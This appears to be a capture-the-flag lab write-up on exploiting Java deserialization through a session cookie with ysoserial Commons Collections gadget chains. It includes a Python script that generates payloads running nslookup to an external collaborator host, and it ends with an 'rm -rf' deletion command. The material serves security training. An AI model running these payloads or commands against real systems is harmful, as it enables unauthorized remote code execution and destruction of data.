This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

# Vuln assessment

The lab gives a hint about the use of apache commons library. Next find where serialization is used:

![[burp-warning.png]]

The `session` cookie seems to be the injection point for serialized objects.
 
Now list the available payloads in `ysoserial`:

![[gadgets.png]]

There are 8 gadgets, now the question is which one will work?

I wrote a python script that generates the payload for all the available gadgets to perform a DNS query to the collaborator, then load them into a in Intruder attack:

```python
import os

gadgets = ["CommonsBeanutils1","CommonsCollections1","CommonsCollections2",
"CommonsCollections3",
"CommonsCollections4",
"CommonsCollections5","CommonsCollections6",
"CommonsCollections7"]

for gadget in gadgets:
	os.system("java -jar ~/tools/ysoserial-all.jar "+ gadget + " 'nslookup vfe3b0nca4h59vcj9te13qb4hvnmbcz1.oastify.com' | base64 -w0 >> ser.txt")
	os.system('echo "\r" >> ser.txt')
```

All the payloads are stored in the `ser.txt` file. Now execute the intruder attack into the `session` cookie input URL encoding each payload.

The DNS interaction is received

# Exploitation

Figura out which gadget worked and use it with `ysoserial` executing the `rm -rf /home/carlos/morale.txt` command





